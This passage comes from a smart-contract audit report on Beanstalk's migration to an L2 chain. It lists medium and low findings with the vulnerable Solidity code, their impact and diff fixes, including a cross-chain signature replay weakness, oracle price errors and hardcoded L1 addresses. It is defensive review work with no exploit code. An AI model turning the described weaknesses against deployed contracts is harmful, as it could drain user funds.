        AppStorage storage s = LibAppStorage.diamondStorage();
        uint256 whitelistedStatusLength = s.sys.silo.whitelistStatuses.length;
        uint256 i;
        // @audit-issue this function reverts when there are no elements into the dynamic array
        while (s.sys.silo.whitelistStatuses[i].token != token) {
            i++;
            if (i >= whitelistedStatusLength) {
                return (false, false);
            }
        }

        if (s.sys.silo.whitelistStatuses[i].isWhitelisted) {
            return (true, false);
        } else {
            return (false, true);
        }
    }
```

This function is intended to loop through all the whitelisted tokens in order to find or not the token in the array. However, if the list is empty, it will try to access the first element and it will revert due to out of bound.
Since there will be no initialization of the diamond before the reseeds on L2, the init function to whitelist the tokens will revert due to this error because the array of whitelisted tokens will have 0 elements and the first condition in the while loop will try to access the array `s.sys.silo.whitelistStatuses[i].token` i being 0 and since it will be empty it will revert.

## Impact

Medium, the reseed function will revert but no funds are at risk

## Tools Used

Manual review

## Recommendations

Add the following changes:

```diff
    function checkWhitelisted(
        address token
    ) internal view returns (bool isWhitelisted, bool previouslyWhitelisted) {
        AppStorage storage s = LibAppStorage.diamondStorage();
        uint256 whitelistedStatusLength = s.sys.silo.whitelistStatuses.length;
+       if(whitelistedStatusLength == 0){
+           return (false, false);
+       }
        uint256 i;
        while (s.sys.silo.whitelistStatuses[i].token != token) {
            i++;
            if (i >= whitelistedStatusLength) {
                return (false, false);
            }
        }

        if (s.sys.silo.whitelistStatuses[i].isWhitelisted) {
            return (true, false);
        } else {
            return (false, true);
        }
    }
```

## <a id='M-28'></a>M-28. Incorrect Loop Counter Increment in `ReseedField` Contract

_Submitted by [Rhaydden](https://profiles.cyfrin.io/u/undefined), [Nexarion](https://profiles.cyfrin.io/u/undefined), [psb01](https://profiles.cyfrin.io/u/undefined), [Akay](https://profiles.cyfrin.io/u/undefined), [golanger85](https://profiles.cyfrin.io/u/undefined), [Sparrow](https://profiles.cyfrin.io/u/undefined). Selected submission by: [Akay](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The inner loop incorrectly increments the outer loop's counter variable, leading to potential infinite loops, skipped data processing, and possible out-of-bounds array access.

## Vulnerability Details

Looking at the `init` function;
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/4e0ad0b964f74a1b4880114f4dd5b339bc69cd3e/protocol/contracts/beanstalk/init/reseed/L2/ReseedField.sol#L49>

```solidity
for (uint i; i < accountPlots.length; i++) {
    for (uint j; j < accountPlots[i].plots.length; i++) {
        // ... (loop body)
    }
}
```

The inner loop mistakenly uses `i++` instead of `j++` to increment its counter. This causes the outer loop's counter to be incremented in each iteration of the inner loop, rather than the inner loop's own counter.

## Impact

If any account has more than one plot, the inner loop may never terminate. Also, most `accountPlots` entries may be skipped, leaving large portions of data unprocessed. As `i` is incremented in the inner loop, it may exceed `accountPlots.length`, causing an out-of-bounds access attempt  and due to the skipped data, the contract's state (including `calculatedTotalPods`) may be incorrectly initialized.

## Tools Used

Manual code review

## Recommendations

Modify the inner loop to correctly increment its counter:

```diff
for (uint i; i < accountPlots.length; i++) {
-  for (uint j; j < accountPlots[i].plots.length; i++) {
+ for (uint j; j < accountPlots[i].plots.length; j++) {
        // ... (loop body)
    }
}
```

## <a id='M-29'></a>M-29. The default gauge point function is not used even if selector of ss.gaugePointImplementation is 0

_Submitted by [simon0417](https://profiles.cyfrin.io/u/undefined)._      
            


### Relevant GitHub Links

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/4e0ad0b964f74a1b4880114f4dd5b339bc69cd3e/protocol/contracts/libraries/LibGauge.sol#L200>

## Summary

In `LibGauge::calcGaugePoints`, `IGaugePointFacet::defaultGaugePointFunction` is supposed to be used as the gauge point function to calculate the gauge points when no gauge point function is provided. However, `IGaugePointFacet::defaultGaugePointFunction` is never used.

## Vulnerability Details

```Solidity
   function calcGaugePoints(
        AssetSettings memory ss,
        uint256 percentDepositedBdv
    ) internal view returns (uint256 newGaugePoints) {
        // if the target is 0, use address(this).
        address target = ss.gaugePointImplementation.target;
        if (target == address(0)) {
            target = address(this);
        }
        // if no selector is provided, use defaultGaugePointFunction
        bytes4 selector = ss.gaugePointImplementation.selector;
        if (selector == bytes4(0)) {
@>            selector = IGaugePointFacet.defaultGaugePointFunction.selector;
        }

        (bool success, bytes memory data) = target.staticcall(
            abi.encodeWithSelector(
@>             ss.gaugePointImplementation.selector,
                ss.gaugePoints,
                ss.optimalPercentDepositedBdv,
                percentDepositedBdv
            )
        );

        if (!success) return ss.gaugePoints;
        assembly {
            newGaugePoints := mload(add(data, add(0x20, 0)))
        }
    }

```

In the function, the selector of `IGaugePointFacet::defaultGaugePointFunction` is assigned to the variable `selector` if the selector of `ss.gaugePointImplementation` is 0. However, it is never used afterward.

## Impact

When the function is called without providing the selector of `ss.gaugePointImplementation`, it will always return the `ss.gaugePoints` instead of calculating with `IGaugePointFacet::defaultGaugePointFunction` as planned. This will cause the gauge point to be calculated incorrectly, and the owner of the whitelisted Lp token would receive the wrong amount of Grown stalk if `IGaugePointFacet::defaultGaugePointFunction` is expected to be used to calculate the gauge point for the new Season. 

## Tools Used

Manual Review

## Recommendations

It can be improved by replacing the `ss.gaugePointImplementation.selector` in the parameter of the `staticcall` function with the `selector` variable.

```diff

        (bool success, bytes memory data) = target.staticcall(
            abi.encodeWithSelector(
-               ss.gaugePointImplementation.selector,
+               selector,
                ss.gaugePoints,
                ss.optimalPercentDepositedBdv,
                percentDepositedBdv
            )
        );

```

## <a id='M-30'></a>M-30. Cross-Chain Replay Attack Vulnerability in Beanstalk's L2ContractMigrationFacet

_Submitted by [golanger85](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

Beanstalk is migrating from an L1 network to an L2 network, such as Arbitrum. During this process, the redeemDepositsAndInternalBalances function in the L2ContractMigrationFacet contract is vulnerable to cross-chain replay attacks due to the way signatures are verified without incorporating the chainId.

This can happen when there is also a fork in the chain.

## Vulnerability Details

The redeemDepositsAndInternalBalances function verifies the authenticity of transactions using EIP-712 signatures. However, the current implementation of the verifySignature function does not include the chainId in the hash computation, making it possible for an attacker to replay the same transaction on different chains.

```Solidity
function redeemDepositsAndInternalBalances(
        address owner,// L1 address
        address reciever,// L2 address
        AccountDepositData[] calldata deposits,
        AccountInternalBalance[] calldata internalBalances,
        uint256 ownerRoots,
        bytes32[] calldata proof,
        uint256 deadline,
        bytes calldata signature
    ) external payable fundsSafu noSupplyChange nonReentrant {
        // verify deposits are valid.
        // note: if the number of contracts that own deposits is small,
        // deposits can be stored in bytecode rather than relying on a merkle tree.
        verifyDepositsAndInternalBalances(owner, deposits, internalBalances, ownerRoots, proof);

        // signature verification.
        verifySignature(owner, reciever, deadline, signature);

        // set deposits for `reciever`.
        uint256 accountStalk;
        for (uint256 i; i < deposits.length; i++) {
            accountStalk += addMigratedDepositsToAccount(reciever, deposits[i]);
        }

        // set stalk for account.
        setStalk(reciever, accountStalk, ownerRoots);
    }

    /**
     * @notice verfies that the input parameters for deposits
     * are correct.
     */
    function verifyDepositsAndInternalBalances(
        address account,
        AccountDepositData[] calldata deposits,
        AccountInternalBalance[] calldata internalBalances,
        uint256 ownerRoots,
        bytes32[] calldata proof
    ) internal pure {//@audit not including chainId
        bytes32 leaf = keccak256(abi.encode(account, deposits, internalBalances, ownerRoots));
        require(MerkleProof.verify(proof, MERKLE_ROOT, leaf), "Migration: invalid proof");
    }

```

```Solidity
function verifySignature(
    address owner,
    address receiver,
    uint256 deadline,
    bytes calldata signature
) internal view {
    require(block.timestamp <= deadline, "Migration: permit expired deadline");
    bytes32 structHash = keccak256(
        abi.encode(REDEEM_DEPOSIT_TYPE_HASH, owner, receiver, deadline)
    );

    bytes32 hash = _hashTypedDataV4(structHash);
    address signer = ECDSA.recover(hash, signature);
    require(signer == owner, "Migration: permit invalid signature");
}
```

## Impact

An attacker can exploit this vulnerability by monitoring transactions on one chain and replaying them on another chain(fork) where the same contract is deployed. This can lead to unauthorized claims of tokens and transfers, causing significant financial losses and misdirection of assets.

## Tools Used

Manual Review

## Recommendations

To mitigate this vulnerability, it is crucial to include the chainId in the EIP-712 signature verification process. This ensures that each signature is unique to the specific chain it was intended for, preventing replay attacks across different chains.

The updated verifySignature function should include the chainId in the structHash computation, as shown below.

```Solidity
function verifySignature(
    address owner,
    address receiver,
    uint256 deadline,
    bytes calldata signature
) internal view {
    require(block.timestamp <= deadline, "Migration: permit expired deadline");
    bytes32 structHash = keccak256(
        abi.encode(REDEEM_DEPOSIT_TYPE_HASH, owner, receiver, deadline, block.chainid)
    );

    bytes32 hash = _hashTypedDataV4(structHash);
    address signer = ECDSA.recover(hash, signature);
    require(signer == owner, "Migration: permit invalid signature");
}
```


## <a id='M-31'></a>M-31. Incorrect conditional in LibUsdOracle leads mal functioning price feeds

_Submitted by [KalyanSingh2](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

In LibUsdOracle.sol if oracleEncoded type 0x02 is passed than there is a possibility that in the uniswap pool both base token and quote token are passed as the same token due to error in conditional

## Vulnerability Details

```solidity
            address chainlinkToken = IUniswapV3PoolImmutables(oracleImpl.target).token0();
            chainlinkToken = chainlinkToken == token
                ? IUniswapV3PoolImmutables(oracleImpl.target).token1()
                : token; ///@audit this conditional make chainlinkToken = token
            tokenPrice = LibUniswapOracle.getTwap(
                lookback == 0 ? LibUniswapOracle.FIFTEEN_MINUTES : uint32(lookback),
                oracleImpl.target,
                chainlinkToken, ///@audit hence in turn makes quote token = base
                token, ///@audit as chainlinkToken = token 
                uint128(10) ** uint128(IERC20Decimals(token).decimals())
            );
```

There will be 2 scenarios in 1st the code works correctly but in second it does not work -\
(1st scenario where token = token0 of uni pool , 2nd where token = token1)

In the above code snippet first chalinkToken = Token0\
now if chainlinkToken(token0) == token(token0) then chainlinkToken = token1\
So in the this case the code works fine but consider the below scenario

chainlinkToken = Token0\
now if chainlinkToken(token0) != token(token1) then chainlinkToken = token\
so now both chainlinkToken & token = token1\
& which passes token1= token0 in LibUniswap which getsQuoteAtTick by passing the same token twice

```solidity
    function getTwap(
        uint32 lookback,
        address pool,
        address token1,
        address token2,
        uint128 oneToken
    ) internal view returns (uint256 price) {
        (bool success, int24 tick) = consult(pool, lookback);
        if (!success) return 0;
        price = OracleLibrary.getQuoteAtTick(tick, oneToken, token1, token2);
											       ///@audit ^ token1 = token2       
    }
```

which leads to malfunction price feed if uniswap pool is used

**Please note that this is not the same as another vuln submitted by me , as that shows how base & quote token are interchanged but this shows how baseToken = quoteToken**

**Code snippet**-\
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/4e0ad0b964f74a1b4880114f4dd5b339bc69cd3e/protocol/contracts/libraries/Oracle/LibUsdOracle.sol#L132-L134>

## Impact

Malfunctioning price feed

## Tools Used

Manual Review

## Recommendations

```diff
            address chainlinkToken = IUniswapV3PoolImmutables(oracleImpl.target).token0();
--            chainlinkToken = chainlinkToken == token
--                ? IUniswapV3PoolImmutables(oracleImpl.target).token1()
--                : token;
++            if(chainlinkToken == token){
++			chainlinkToken=IUniswapV3PoolImmutables(oracleImpl.target).token1()
++                 }
            tokenPrice = LibUniswapOracle.getTwap(
                lookback == 0 ? LibUniswapOracle.FIFTEEN_MINUTES : uint32(lookback),
                oracleImpl.target,
                chainlinkToken,
                token,
                uint128(10) ** uint128(IERC20Decimals(token).decimals())
            );
```

The second conditional used is not required and is the root cause of the problem just one conditional is needed since we are first already setting chainlinkToken = token0 , now if chainlinkToken == token the we should just change it to token1 to make sure both the base and quote token are different.Incorrect conditional in LibUsdOracle leads mal functioning price feeds


# Low Risk Findings

## <a id='L-01'></a>L-01.  The `LibWeth` hardcodes the `WETH` address which makes it incompatible on the to-deploy L2 chain

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined), [Bauchibred](https://profiles.cyfrin.io/u/undefined), [asefewwexa](https://profiles.cyfrin.io/u/undefined), [datamcrypto](https://profiles.cyfrin.io/u/undefined), [Bube](https://profiles.cyfrin.io/u/undefined). Selected submission by: [Bauchibred](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/libraries/Token/LibWeth.sol#L15-L37


## Summary

The `LibWeth` library hardcodes the `WETH` address, which makes all the wrapping/unwrapping functionality it entails to be unavailable/incompatible with the L2 chain where Beanstalk will be deployed.

## Vulnerability Details

Take a look at https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/libraries/Token/LibWeth.sol#L15-L37

```solidity
library LibWeth {
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function wrap(uint256 amount, LibTransfer.To mode) internal {
        deposit(amount);
        LibTransfer.sendToken(IERC20(WETH), amount, msg.sender, mode);
    }

    function unwrap(uint256 amount, LibTransfer.From mode) internal {
        amount = LibTransfer.receiveToken(IERC20(WETH), amount, msg.sender, mode);
        withdraw(amount);
        (bool success, ) = msg.sender.call{value: amount}(new bytes(0));
        require(success, "Weth: unwrap failed");
    }

    function deposit(uint256 amount) private {
        IWETH(WETH).deposit{value: amount}();
    }

    function withdraw(uint256 amount) private {
        IWETH(WETH).withdraw(amount);
    }
}
```

This is the whole library that handles the wrapping and unwrapping `Weth`, issue however is that the `WETH` address has been hardcoded as `0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2`.

And with the Beanstalk the finale contest, The Beanstalk team hinted that the contracts are to be deployed on an L2, the votes for this has already been passed, and this [snapshot](https://snapshot.org/#/beanstalkfarms.eth/proposal/0x93dfc538a66c1c199f5c9f0fd9c0233ce3625c7ada9743bafc8b5fbc0fc38fc7) shows how this would be done.

Problem however is that the `0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2` is only sure as the `WETH` address on the EThereum mainnet if the contracts get deployed on an L2 that does not have the `0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2` address as WETH, then all the functionalities of this contract are effectively DOS'd and unaccessible.

## Impact

Complete DOS to thee functionality of wrapping and unwrapping `WETH` on the to-deploy L2 chain, would be key to note that in this case not only is the `LibWeth` affected, but all functionalities that query this, i.e the TokenFacers

## Tools Used

Manual review

## Recommendations

Consider not hardcoding `0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2` as the WETH address, considering the protocol is to be deployed on multiple chains and then have the correct address be passed during deployment.

## <a id='L-02'></a>L-02. LibUsdOracle inverses Chainlink TWAP price which results in incorrect price

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Oracle/LibChainlinkOracle.sol#L96

https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Oracle/LibUsdOracle.sol#L49-L65

## Summary
Here is good article on why arithmetic mean TWAP cannot be inversed to get price of second asset:
https://blog.yacademy.dev/2024-05-24-are-inverse-TWAP-prices-inaccurate/

In short inverse of average price is not equal to average of inverse prices. The more volatile the price over the observed period, the greater the distortion will be.
That's why Uniswap V2 stores 2 prices: token0 and token1 to calculate each TWAP. But that's true only for arithmetic mean, in Uni V3 geometric mean is used, and this price can be inversed.


## Vulnerability Details
LibUsdOracle.sol returns price USD / Token by inversing price fetched from ordinary oracle:
```solidity
    function getUsdPrice(address token, uint256 lookback) internal view returns (uint256) {
        if (token == C.WETH) {
            uint256 ethUsdPrice = LibEthUsdOracle.getEthUsdPrice(lookback);
            if (ethUsdPrice == 0) return 0;
@>          return uint256(1e24).div(ethUsdPrice);
        }
        if (token == C.WSTETH) {
            uint256 wstethUsdPrice = LibWstethUsdOracle.getWstethUsdPrice(lookback);
            if (wstethUsdPrice == 0) return 0;
@>          return uint256(1e24).div(wstethUsdPrice);
        }

        // 1e18 * 1e6 = 1e24.
        uint256 tokenPrice = getTokenPriceFromExternal(token, lookback);
        if (tokenPrice == 0) return 0;
@>      return uint256(1e24).div(tokenPrice);
    }
```

One of oracle sources is Chainlink TWAP like in `LibEthUsdOracle.getEthUsdPrice()`:
```solidity
    function getEthUsdPrice(uint256 lookback) internal view returns (uint256) {
        return
            lookback > 0
                ? LibChainlinkOracle.getTwap(
                    C.ETH_USD_CHAINLINK_PRICE_AGGREGATOR,
                    LibChainlinkOracle.FOUR_HOUR_TIMEOUT,
                    lookback
                )
                : LibChainlinkOracle.getPrice(
                    C.ETH_USD_CHAINLINK_PRICE_AGGREGATOR,
                    LibChainlinkOracle.FOUR_HOUR_TIMEOUT
                );
    }
```

And finally let's see that Chainlink TWAP calculates arithmetic mean TWAP:
```solidity
    function getTwap(
        address priceAggregatorAddress,
        uint256 maxTimeout,
        uint256 lookback
    ) internal view returns (uint256 price) {
        ...

        // Secondly, try to get latest price data:
        try priceAggregator.latestRoundData() returns (
            uint80 roundId,
            int256 answer,
            uint256 /* startedAt */,
            uint256 timestamp,
            uint80 /* answeredInRound */
        ) {
            ...
                while (timestamp > t.endTimestamp) {
@>                  t.cumulativePrice = t.cumulativePrice.add(
                        uint256(answer).mul(t.lastTimestamp.sub(timestamp))
                    );
                    roundId -= 1;
                    t.lastTimestamp = timestamp;
                    (answer, timestamp) = getRoundData(priceAggregator, roundId);
                    if (
                        checkForInvalidTimestampOrAnswer(
                            timestamp,
                            answer,
                            t.lastTimestamp,
                            maxTimeout
                        )
                    ) {
                        return 0;
                    }
                }
@>              t.cumulativePrice = t.cumulativePrice.add(
                    uint256(answer).mul(t.lastTimestamp.sub(t.endTimestamp))
                );
                return t.cumulativePrice.mul(PRECISION).div(10 ** decimals).div(lookback);
            }
        } catch {
        ...
    }
```

## Impact
LibUsdOracle.sol returns incorrect price if underlying oracle is Chainlink TWAP.

## Tools Used
Manual Review

## Recommendations
Do not inverse Chainlink TWAP price, instead calculate TWAP from inversed prices. However it requires refactor of oracle libraries.
## <a id='L-03'></a>L-03.  `BeanL1RecieverFacet#recieveL1Beans()` would never work

_Submitted by [holydevoti0n](https://profiles.cyfrin.io/u/undefined), [joicygiore](https://profiles.cyfrin.io/u/undefined), [T1MOH](https://profiles.cyfrin.io/u/undefined), [whitehat777](https://profiles.cyfrin.io/u/undefined), [Bauchibred](https://profiles.cyfrin.io/u/undefined), [0xGo](https://profiles.cyfrin.io/u/undefined), [asefewwexa](https://profiles.cyfrin.io/u/undefined), [Rhaydden](https://profiles.cyfrin.io/u/undefined), [Nexarion](https://profiles.cyfrin.io/u/undefined), [Akay](https://profiles.cyfrin.io/u/undefined), [bladesec](https://profiles.cyfrin.io/u/undefined), [simon0417](https://profiles.cyfrin.io/u/undefined), [Sparrow](https://profiles.cyfrin.io/u/undefined), [ZanyBonzy](https://profiles.cyfrin.io/u/undefined), [haxatron](https://profiles.cyfrin.io/u/undefined). Selected submission by: [Bauchibred](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/beanstalk/migration/BeanL1RecieverFacet.sol#L31-L44


## Summary

`BeanL1RecieverFacet#recieveL1Beans()`will never work due to the hardcoded value of `EXTERNAL_L1_BEANS` as `0` which causes the attempt to claim these after the burning on L1 of the tokens to always get reverted [here](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/beanstalk/migration/BeanL1RecieverFacet.sol#L31-L44).

## Vulnerability Details

Take a look at https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/beanstalk/migration/BeanL1RecieverFacet.sol#L31-L44

```solidity
    function recieveL1Beans(address reciever, uint256 amount) external nonReentrant {
        // verify msg.sender is the cross-chain messenger address, and
        // the xDomainMessageSender is the L1 Beanstalk contract.
        require(
            msg.sender == address(BRIDGE) &&
                IL2Messenger(BRIDGE).xDomainMessageSender() == L1BEANSTALK
        );
        s.sys.migration.migratedL1Beans += amount;
        require(
            EXTERNAL_L1_BEANS >= s.sys.migration.migratedL1Beans,
            "L2Migration: exceeds maximum migrated"
        );
        C.bean().mint(reciever, amount);
    }
```

This function is used when attempting to migrate any `amount` of Beans to L2, i.e it's called in the instance below where the amount of beans are minted to the receiver, https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/beanstalk/migration/BeanL2MigrationFacet.sol#L43-L57

```solidity
    function migrateL2Beans(
        address reciever,
        address L2Beanstalk,
        uint256 amount,
        uint32 gasLimit
    ) external nonReentrant {
        C.bean().burnFrom(msg.sender, amount);

        // send data to
        IL2Bridge(BRIDGE).sendMessage(
            L2Beanstalk,
            abi.encodeCall(IBeanL1RecieverFacet(L2Beanstalk).recieveL1Beans, (reciever, amount)),
            gasLimit
        );
    }
```

Issue however is[ the check](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/beanstalk/migration/BeanL1RecieverFacet.sol#L31-L44) ` require(EXTERNAL_L1_BEANS >= s.sys.migration.migratedL1Beans)` would always revert in `recieveL1Beans()` because `EXTERNAL_L1_BEANS` has been erroneously hardcoded to `0`, see https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/beanstalk/migration/BeanL1RecieverFacet.sol#L22

```solidity
    uint256 constant EXTERNAL_L1_BEANS = 0;
```

Which would then mean that for any valid `amount` being passed to migrate the migration always fails with the `   "L2Migration: exceeds maximum migrated"` error since the maximum migrated is being set as `0`.

## Impact

High, considering when migrating the tokens gets [burnt from the user](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/beanstalk/migration/BeanL2MigrationFacet.sol#L49) and then the message is [sent to the L2Bridge with the amount of assets to give to the user](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/beanstalk/migration/BeanL2MigrationFacet.sol#L52-L57), but since the attempt to claim these tokens always gets reverted [here](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/beanstalk/migration/BeanL1RecieverFacet.sol#L31-L44), users have lost their Beans.

## Tools Used

Manual review

## Recommendations

Consider attaching a valid value to `EXTERNAL_L1_BEANS`, if users can still get more external tokens after the initial migration then this value should be updatable and a logic to update this can be attached to the [message that gets sent](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/beanstalk/migration/BeanL2MigrationFacet.sol#L52) when migration of Beans is to occur.

## <a id='L-04'></a>L-04. Incorrect Hardcoded Block Time Assumptions in Beanstalk's LibDibbler 

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined), [bladesec](https://profiles.cyfrin.io/u/undefined), [golanger85](https://profiles.cyfrin.io/u/undefined), [0xnirlin](https://profiles.cyfrin.io/u/undefined). Selected submission by: [golanger85](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

Beanstalk's LibDibbler library assumes a specific block time of 2 seconds (L2\_BLOCK\_TIME = 2) for the Layer 2 (L2) network. This assumption affects the temperature calculation in the morningTemperature function. If Beanstalk is deployed on L2 networks with different block times, such as Arbitrum or Optimism, the calculation will be inaccurate.

## Vulnerability Details

The morningTemperature function in LibDibbler calculates temperature adjustments based on the assumed block time using the following logic:

```Solidity
uint256 delta = block.number.sub(s.sys.season.sunriseBlock).mul(L2_BLOCK_TIME).div(L1_BLOCK_TIME);
```

## Impact

Here, L2\_BLOCK\_TIME is hardcoded to 2 seconds, while L1\_BLOCK\_TIME is assumed to be 12 seconds. This calculation aims to adjust the temperature of BEANSTALK according to the elapsed time since the last sunrise block.

However, different L2 networks have different block times, making this calculation inaccurate if deployed on networks like Arbitrum or Optimism.

Deploying Beanstalk on L2 networks with different block times other than 2 seconds will result in the following issues:

The temperature will either be overestimated or underestimated and inaccurate temperature adjustments could disrupt the balance of supply and demand for Soil and Pods, causing economic inefficiencies in Beanstalk.

## Tools Used

Manual Review

## Recommendations

&#x20;Instead of hardcoding L2\_BLOCK\_TIME, use a dynamic method to set the block time based on the deployed L2 network. This can be done during contract deployment or via an initialization function.

## <a id='L-05'></a>L-05. ETH/USD 1 hour period is too large for Optimism/Base L2 Chains and too small for Arbitrum/Avalanche leading to consuming stale price data.

_Submitted by [holydevoti0n](https://profiles.cyfrin.io/u/undefined), [T1MOH](https://profiles.cyfrin.io/u/undefined), [Bauchibred](https://profiles.cyfrin.io/u/undefined), [Uno](https://profiles.cyfrin.io/u/undefined). Selected submission by: [Uno](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

This is not considered Known Issue.

The stale period 1 hours is too large for Optimism and Base chains, leading to consuming stale price data.\
On the other hand, that period is too small for Arbitrum and Avalanche chains.

## Vulnerability Details

After the Previous Audit (Beanstalk Part 1) The Beanstalk will update CHAINLINK\_TIMEOUT to 1 hour instead of 4 hours but its still an issue after\
the migration to L2 Chains Optimism/Base/Avalanche/Arbitrum etc..

in previous audit a chainlink oracle Vulnerability was submitted and validated as Medium the bug was:

> The `LibChainlinkOracle` library utilizes a `CHAINLINK_TIMEOUT` constant set to `14400` seconds (4 hours). This duration is four times longer than the `Chainlink` heartbeat that is `3600` seconds (1 hour), potentially introducing a significant delay in recognizing stale or outdated price data.

link to previous audit (Beanstalk Part 1):\
<https://codehawks.cyfrin.io/c/2024-02-Beanstalk-1/results?t=report&lt=contest&sc=reward&sj=reward&page=1>



This was on ethereum mainnet but after migration to L2, CHAINLINK\_TIMEOUT must be changed to fit the targeted L2.

Beanstalk will migrate to L2 Optimism or Base or Avalanche etc... and these chains has different ETH/USD heartbeats:

1. On Ethereum, the oracle will update the price data [every \~1 hour](https://data.chain.link/feeds/ethereum/mainnet/eth-usd).
2. On Optimism, the oracle will update the price data [every \~20 minutes](https://data.chain.link/feeds/optimism/mainnet/eth-usd).
3. On Base, the oracle will update the price data [every \~20 minutes](https://data.chain.link/feeds/base/base/eth-usd).
4. On Arbitrum, the oracle will update the price data [every \~24 hours](https://data.chain.link/arbitrum/mainnet/crypto-usd/eth-usd).
5. On Avalanche, the oracle will update the price data [every \~24 hours](https://data.chain.link/feeds/avalanche/mainnet/eth-usd).

On some chains such as Optimism Base, 1 hour considered too large for the stale period, causing to return stale price data.\
And on other chains such as Arbitrum Avalanche 1 hour considered too small.

## Impact

A `CHAINLINK_TIMEOUT` that is significantly longer than the heartbeat can lead to scenarios where the `LibChainlinkOracle`\
library accepts outdated price. &#x20;

## Tools Used

Previous Audits: <https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/issues/961>

## Recommendations

Consider to set the right heartbeat for the targeted L2.

1. &#x20;On Optimism, the oracle will update the price data [every \~20 minutes](https://data.chain.link/feeds/optimism/mainnet/eth-usd).
2. On Base, the oracle will update the price data [every \~20 minutes](https://data.chain.link/feeds/base/base/eth-usd).
3. On Arbitrum, the oracle will update the price data [every \~24 hours](https://data.chain.link/arbitrum/mainnet/crypto-usd/eth-usd).
4. On Avalanche, the oracle will update the price data [every \~24 hours](https://data.chain.link/feeds/avalanche/mainnet/eth-usd).

## <a id='L-06'></a>L-06. The `DepotFacet` contract uses an incorrect `PIPELINE` address.

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined), [asefewwexa](https://profiles.cyfrin.io/u/undefined), [bladesec](https://profiles.cyfrin.io/u/undefined). Selected submission by: [bladesec](https://profiles.cyfrin.io/u/undefined)._      
            


## Github link

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/9c7b9fd521ad7cbe65cc788df181887c0eb39c6d/protocol/contracts/beanstalk/farm/DepotFacet.sol#L21>

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/9c7b9fd521ad7cbe65cc788df181887c0eb39c6d/protocol/contracts/beanstalk/farm/DepotFacet.sol#L31>

## Summary

The `DepotFacet` contract uses an incorrect `PIPELINE` address.

## Vulnerability Details

The `DepotFacet` contract uses a [PIPELINE](https://etherscan.io/address/0xb1bE0000C6B3C62749b5F0c92480146452D15423) address on L1 which is invalid on L2.

```solidity
contract DepotFacet is Invariable {
    // Pipeline V1.0.1
    address private constant PIPELINE = 0xb1bE0000C6B3C62749b5F0c92480146452D15423;

    /**
 * @notice Pipe a PipeCall through Pipeline.
 * @param p PipeCall to pipe through Pipeline
 * @return result PipeCall return value
 **/
    function pipe(
        PipeCall calldata p
 ) external payable fundsSafu noSupplyIncrease returns (bytes memory result) {
 result = IPipeline(PIPELINE).pipe(p);
 }
```

So multiple functions including `pipe()` wouldn't work properly on L2.

## Impact

Multiple functions of the `DepotFacet` contract wouldn't work properly.

## Tools Used

Manual Review

## Recommendations

We should set a `PIPELINE` address as a parameter for L2.

## <a id='L-07'></a>L-07. Cannot configure `temperature` in ReseedField due to type mismatch

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/beanstalk/init/reseed/L2/ReseedField.sol#L45

## Summary
`ReseedField.init()` defines `initialTemperature` as uint8, however it's real type is uint32:
```solidity
    function init(
        MigratedPlotData[] calldata accountPlots,
        uint256 totalPods,
        uint256 harvestable,
        uint256 harvested,
        uint256 fieldId,
@>      uint8 initialTemperature
    ) external {
        ...
@>      s.sys.weather.temp = initialTemperature;
    }
    
struct Weather {
    uint128 lastDeltaSoil; // ───┐ 16 (16)
